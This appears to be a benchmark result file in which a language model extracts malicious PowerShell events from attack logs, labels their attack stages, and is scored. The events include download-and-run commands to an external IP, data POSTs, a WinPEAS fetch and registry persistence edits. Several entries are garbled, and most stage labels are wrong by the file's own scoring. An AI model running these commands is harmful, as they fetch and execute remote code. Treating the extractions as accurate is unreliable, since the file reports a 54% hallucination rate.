@@ -1,0 +1,155 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest t1547.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v verifierdlls /f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/test.hta -method post-usebasicparsing-contenttype \\\"application.json\\\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "power shell -executionpolicy bypass -c invoke-webservice request http://124.223.85.207:8082/test.hta-method post-use basic parsing-contenttype application/json ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1047.002 -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/WinPEAS.exe -Method POST-UseBasicParsing -ContentType \\\"application/octet-stream\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1219.002 -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1219.004 -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1219.006 -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1204.001 -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/ImageInfo.js -UseBasicParsing\", ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebServiceRequest http://124.223.85.207:8082/image info.js-usebasicparsing-contenttype application/javascript\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-Webreqest http://124.223.85.207:8082/ Image Info.js-usebasicparsing\", ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebReqest http://124.223.85.207:8082/imageinfo.js-usebasicparsing-contenttype application/javascript\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest -uri http://124.223.85.207:8082/new -use Basic Parsing\u201c, \u201cstage\u201d:\u201cdefense evasion\u201d}, # This command uses the PowerShell Web Request module to make an HTTP GET request to the specified URI. The use of the -Uri parameter indicates that the request is intended to retrieve content from the server. Additionally, the \u2013UseBasicParsing parameter suggests that the response will be parsed using basic methods, such as reading the contents of the response body as plain text. Overall, this command appears to be collecting information from an external source via an HTTP request, making it a case of collection. However, due to the lack of specific details regarding what information is being collected, we can't pinpoint the stage precisely without more context.",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attackers have executed various PowerShell scripts to collect sensitive information, evade defenses, and move laterally within the network. They utilized multiple techniques like creating temporary files, registry modifications, and web requests to achieve their goals.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 40803,
+      "completion_tokens": 1453,
+      "total_tokens": 42256,
+      "wall_clock_s": 26.689,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3076923076923077,
+      "recall": 0.47058823529411764,
+      "f1": 0.372093023255814,
+      "tp": 8,
+      "fp": 18,
+      "fn": 9
+    },
+    "stage": {
+      "precision": 0.038461538461538464,
+      "recall": 0.07142857142857142,
+      "f1": 0.05,
+      "tp": 1,
+      "fp": 25,
+      "fn": 13,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.5384615384615384,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 40803,
+      "completion_tokens": 1453,
+      "total_tokens": 42256,
+      "wall_clock_s": 26.689,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
